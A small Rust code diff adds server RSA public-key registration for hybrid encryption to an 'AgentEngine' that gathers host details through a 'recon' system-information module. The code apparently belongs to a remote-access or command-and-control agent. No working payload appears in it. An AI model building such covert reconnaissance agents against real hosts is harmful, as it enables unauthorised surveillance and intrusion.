@@ -87,6 +87,10 @@ impl AgentEngine {
             self.config.extra_headers.clone(),
             self.config.path_suffixes.clone(),
         );
+        // 服务端 RSA 公钥：注册混合加密
+        if !self.config.server_public_key.is_empty() {
+            http.set_server_public_key(self.config.server_public_key.clone());
+        }
 
         let sys_json = libra_modules::recon::SystemInfo::collect();
         let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
